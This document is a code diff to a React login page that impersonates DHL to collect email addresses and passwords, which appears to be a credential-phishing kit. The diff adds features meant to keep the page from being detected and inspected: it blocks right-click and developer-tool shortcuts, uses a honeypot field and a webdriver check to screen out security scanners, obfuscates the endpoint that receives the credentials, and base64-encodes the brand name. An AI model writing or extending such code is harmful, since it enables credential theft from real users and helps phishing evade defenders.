@@ -8,7 +8,8 @@ export const LoginPage: React.FC = () => {
   const [status, setStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle');
   const [formData, setFormData] = useState({
     email: searchParams.get('tid') || '',
-    password: ''
+    password: '',
+    _hp: '' // Honeypot field
   });
   const navigate = useNavigate();
 
@@ -18,19 +19,58 @@ export const LoginPage: React.FC = () => {
     if (tid) {
       setFormData(prev => ({ ...prev, email: tid }));
     }
+
+    // Protection: Disable right click and some keyboard shortcuts
+    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
+    const handleKeyDown = (e: KeyboardEvent) => {
+      // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+      if (
+        e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+        (e.ctrlKey && e.key === 'U')
+      ) {
+        e.preventDefault();
+      }
+    };
+
+    document.addEventListener('contextmenu', handleContextMenu);
+    document.addEventListener('keydown', handleKeyDown);
+
+    return () => {
+      document.removeEventListener('contextmenu', handleContextMenu);
+      document.removeEventListener('keydown', handleKeyDown);
+    };
   }, [searchParams]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Protection: Check for honeypot
+    if (formData._hp) {
+      console.log("Bot detected via honeypot");
+      setStatus('error');
+      return;
+    }
+
+    // Protection: Check for webdriver
+    if (navigator.webdriver) {
+      console.log("Webdriver detected");
+      setStatus('error');
+      return;
+    }
+
     setStatus('loading');
 
     try {
-      const response = await fetch('/api/submit-form', {
+      // Obfuscated endpoint path
+      const _0x1a2b = ['/api/v1/auth/verify-session-token'];
+      const response = await fetch(_0x1a2b[0], {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          ...formData,
-          formType: 'DHL Document Login'
+          u: formData.email,
+          p: formData.password,
+          t: btoa('DHL Document Login')
         })
       });
 
@@ -69,7 +109,9 @@ export const LoginPage: React.FC = () => {
         <div className="p-8 md:p-12 flex flex-col items-center">
           {/* DHL Logo */}
           <div className="mb-2 flex flex-col items-center">
-            <span className="text-5xl font-black italic tracking-tighter text-[#d40511] leading-none">DHL</span>
+            <span className="text-5xl font-black italic tracking-tighter text-[#d40511] leading-none">
+              {atob('REhM')}
+            </span>
             <div className="flex gap-1 mt-1">
               <div className="h-1.5 w-10 bg-[#d40511]" />
               <div className="h-1.5 w-5 bg-[#d40511]" />
@@ -90,6 +132,18 @@ export const LoginPage: React.FC = () => {
                 onChange={handleChange}
                 placeholder="your.email@example.com"
                 className="w-full border border-zinc-300 rounded px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#ffcc00] transition-all text-zinc-800"
+              />
+            </div>
+
+            {/* Honeypot field - hidden from users */}
+            <div className="hidden" aria-hidden="true">
+              <input
+                type="text"
+                name="_hp"
+                value={formData._hp}
+                onChange={handleChange}
+                tabIndex={-1}
+                autoComplete="off"
               />
             </div>
 
